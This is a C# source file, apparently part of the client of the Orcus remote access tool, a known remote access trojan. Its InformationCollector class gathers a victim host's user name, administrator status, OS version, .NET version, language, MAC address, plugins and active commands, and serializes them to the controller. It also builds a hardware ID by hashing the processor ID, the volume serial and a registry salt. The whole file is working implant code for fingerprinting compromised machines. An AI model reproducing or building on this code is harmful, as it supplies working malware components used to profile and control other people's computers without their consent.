using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Orcus.Config;
using Orcus.Plugins;
using Orcus.Service;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.NetSerializer;
using Orcus.StaticCommandManagement;
using Orcus.Utilities;
using PluginInfo = Orcus.Shared.Connection.PluginInfo;

namespace Orcus.Connection
{
    internal static class InformationCollector
    {
        private static BasicComputerInformation _basicComputerInformation;

        public static void SendInformation(Stream stream)
        {
            if (_basicComputerInformation == null)
            {
                _basicComputerInformation = new BasicComputerInformation
                {
                    UserName = Environment.UserName,
                    IsAdministrator = User.IsAdministrator,
                    ClientConfig = Settings.ClientConfig,
                    ClientVersion = Program.Version,
                    ApiVersion = Program.AdministrationApiVersion,
                    ClientPath = Consts.ApplicationPath,
                    FrameworkVersion = GetFrameworkVersion()
                };

                var culture = CultureInfo.InstalledUICulture;
                _basicComputerInformation.Language = culture.TwoLetterISOLanguageName;
                if (culture.LCID != 4096)
                    try
                    {
                        _basicComputerInformation.Language += $"-{new RegionInfo(culture.LCID).TwoLetterISORegionName}";
                    }
                    catch (Exception)
                    {
                        // ignored
                    }

                switch (Environment.OSVersion.Platform)
                {
                    case PlatformID.Win32S:
                        _basicComputerInformation.OperatingSystemName = "Windows 3.1";
                        break;
                    case PlatformID.Xbox:
                        _basicComputerInformation.OperatingSystemName = "XBox";
                        break;
                    case PlatformID.Win32Windows:
                        _basicComputerInformation.OperatingSystemName = "Win32 Windows";
                        break;
                    case PlatformID.Win32NT:
                        _basicComputerInformation.OperatingSystemName = GetOsFriendlyName();
                        if (_basicComputerInformation.OperatingSystemName.Contains("Windows 7"))
                            _basicComputerInformation.OperatingSystemType = OSType.Windows7;
                        else if (_basicComputerInformation.OperatingSystemName.Contains("Windows 8"))
                            _basicComputerInformation.OperatingSystemType = OSType.Windows8;
                        else if (_basicComputerInformation.OperatingSystemName.Contains("Windows 10"))
                            _basicComputerInformation.OperatingSystemType = OSType.Windows10;
                        else if (_basicComputerInformation.OperatingSystemName.Contains("Vista"))
                            _basicComputerInformation.OperatingSystemType = OSType.WindowsVista;
                        else if (_basicComputerInformation.OperatingSystemName.Contains("XP"))
                            _basicComputerInformation.OperatingSystemType = OSType.WindowsXp;
                        break;
                    case PlatformID.WinCE:
                        _basicComputerInformation.OperatingSystemName = "Windows CE";
                        break;
                    default:
                        _basicComputerInformation.OperatingSystemName = "Unknown: " + Environment.OSVersion.Platform;
                        break;
                }

                if (string.IsNullOrEmpty(_basicComputerInformation.OperatingSystemName))
                    _basicComputerInformation.OperatingSystemName = Environment.OSVersion.VersionString;

                try
                {
                    _basicComputerInformation.MacAddress = GetMacAddress();
                }
                catch (Exception)
                {
                    //NetworkInformationException?
                }
            }

            _basicComputerInformation.IsServiceRunning = ServiceConnection.Current.IsConnected;
            _basicComputerInformation.Plugins =
                PluginLoader.Current.AvailablePlugins.Select(
                    x =>
                        new PluginInfo
                        {
                            Guid = x.Key.Guid,
                            Name = x.Key.PluginName,
                            Version = x.Key.PluginVersion,
                            IsLoaded = x.Value
                        }).ToList();
            _basicComputerInformation.LoadablePlugins =
                Directory.Exists(Consts.PluginsDirectory)
                    ? new DirectoryInfo(Consts.PluginsDirectory).GetFiles()
                        .Select(
                            x =>
                                Regex.Match(x.Name, @"^(?<guid>([0-9A-Fa-f]{32}))_(?<version>(\d+(?:\.\d+)+))$"))
                        .Where(x => x.Success)
                        .Select(
                            x =>
                                new LoadablePlugin
                                {
                                    Guid = new Guid(x.Groups["guid"].Value),
                                    Version = x.Groups["version"].Value
                                })
                        .ToList()
                    : null;
            _basicComputerInformation.ActiveCommands = StaticCommandSelector.Current.GetActiveCommandIds();

            var types = new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes())
            {
                typeof (BasicComputerInformation)
            };
            var serializer = new Serializer(types);
            serializer.Serialize(stream, _basicComputerInformation);
        }

        private static string GetOsFriendlyName()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
                    return searcher.Get().OfType<ManagementObject>().FirstOrDefault()?["Caption"].ToString();
            }
            catch (Exception)
            {
                return "";
            }
        }

        private static double GetFrameworkVersion()
        {
            try
            {
                using (
                    var installedVersions =
                        Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP"))
                {
                    if (installedVersions == null)
                        return 0;

                    var versions = installedVersions.GetSubKeyNames();
                    var fw = double.Parse(versions[versions.Length - 1].Remove(0, 1), CultureInfo.InvariantCulture);
                    if (fw == 4)
                    {
                        using (
                            var ndpKey =
                                Registry.LocalMachine.OpenSubKey(
                                    "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
                        {
                            if (ndpKey == null)
                                return fw;

                            int releaseKey = (int) ndpKey.GetValue("Release");
                            if (releaseKey >= 393273)
                            {
                                return 4.6;
                            }
                            if (releaseKey >= 379893)
                            {
                                return 4.52;
                            }
                            if (releaseKey >= 378675)
                            {
                                return 4.51;
                            }
                            return 4.5;
                        }
                    }

                    return fw;
                }
            }
            catch (Exception)
            {
                return 0;
            }
        }

        public static string GetHardwareId()
        {
            var input = new StringBuilder();

            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * FROM WIN32_Processor"))
                {
                    var processorManagementObject = searcher.Get().OfType<ManagementObject>().FirstOrDefault();
                    if (processorManagementObject != null)
                    {
                        input.Append(processorManagementObject["ProcessorId"]);
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                var drive = DriveInfo.GetDrives().First().Name.Replace("\\", null);
                using (var dsk = new ManagementObject(@"win32_logicaldisk.deviceid=""" + drive + "\""))
                {
                    dsk.Get();

                    input.Append(dsk["VolumeSerialNumber"]);
                }
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                using (
                    var regKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Orcus",
                        RegistryKeyPermissionCheck.ReadSubTree))
                {
                    var value = (string) regKey?.GetValue("HardwareIdSalt", null, RegistryValueOptions.None);
                    if (value != null)
                        input.Append(value);
                }
            }
            catch (Exception)
            {
                // ignored
            }

            using (var md5 = new MD5CryptoServiceProvider())
            {
                return BitConverter.ToString(md5.ComputeHash(Encoding.UTF8.GetBytes(input.ToString())))
                    .Replace("-", null);
            }
        }

        private static byte[] GetMacAddress()
        {
            byte[] macAddress = null;
            long maxSpeed = -1;

            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                var addressBytes = nic.GetPhysicalAddress().GetAddressBytes();
                if (nic.Speed > maxSpeed && addressBytes.Length == 6)
                {
                    maxSpeed = nic.Speed;
                    macAddress = addressBytes;
                }
            }

            return macAddress;
        }
    }
}